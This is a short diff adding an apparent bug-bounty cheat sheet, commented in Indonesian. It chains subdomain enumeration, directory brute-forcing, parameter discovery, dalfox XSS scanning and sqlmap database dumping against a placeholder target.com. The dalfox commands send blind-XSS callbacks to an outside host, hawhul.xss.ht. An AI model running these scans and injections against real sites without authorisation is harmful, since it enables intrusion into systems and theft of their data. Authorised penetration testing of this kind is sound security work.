@@ -1,0 +1,39 @@
+
+#LIST INSTALL TOOLS
+sudo apt install subfinder
+sudo apt install httpx-toolkit
+sudo apt install paramspider
+sudo apt install dirsearch
+
+#dalfox ga ada bawaan langsung dari Kali Linux
+sudo apt install golang
+go install github.com/hahwul/dalfox/v2@latest
+cp ~/go/bin/dalfox /usr/bin/
+
+sudo apt install sqlmap
+
+==================================================
+
+# CARI SUBDOMAIN, SAVE HASIL KE "subs.txt"
+subfinder -d target.com -o subs.txt
+
+# TES KEAKTIFAN SUBDOMAIN DARI "subs.txt". SAVE KE "subs-active.txt"
+httpx-toolkit -l subs.txt -o subs-active.txt -mc 200
+
+# CARI DIREKTORI DARI "subs-active.txt"
+sudo dirsearch -u target.com -i 200
+sudo dirsearch -l subs-active.txt -i 200
+# Output on ./reports/BATCH-<date>/BATCH.txt
+
+# CARI PARAMETER
+paramspider -d target.com
+paramspider -l subs-active.txt
+# Output on ./results/<subdomains>.txt
+
+# XSS
+dalfox url http://target.com/index.php?cat=FUZZ -b hawhul.xss.ht -o dalfoxes.txt
+dalfox file results/*.txt -b hawhul.xss.ht -o dalfoxes.txt # GA BISA WILDCARD(*) WOE, HARUS SEBUT SATU-SATU FILE NYA
+
+# SQLi - WIP lagi riset outputnya
+sqlmap -u target.com/index.php?par=1 --dbs --batch
+sqlmap -m results/*.txt --dbs --batch
